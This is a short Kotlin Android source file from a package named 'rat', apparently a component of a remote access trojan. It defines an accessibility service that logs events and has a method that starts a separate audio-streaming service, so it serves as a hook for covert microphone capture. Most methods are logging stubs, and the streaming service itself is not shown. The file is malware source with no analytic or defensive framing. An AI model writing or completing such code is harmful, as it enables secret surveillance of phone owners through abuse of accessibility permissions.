package com.example.rat

import android.accessibilityservice.AccessibilityService
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.content.Intent

class MyAccessibilityService : AccessibilityService() {
    private val TAG = "MyAccessibilityService"

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        Log.d(TAG, "onAccessibilityEvent: ${event?.eventType}")
        // Обработка событий, если необходимо
    }

    override fun onInterrupt() {
        Log.d(TAG, "onInterrupt called")
    }

    fun startAudioRecording() {
        Log.d(TAG, "Starting audio recording")
        val serviceIntent = Intent(this, AudioStreamingService::class.java)
        startForegroundService(serviceIntent)
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.d(TAG, "Accessibility Service connected")
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.d(TAG, "Accessibility Service destroyed")
    }
}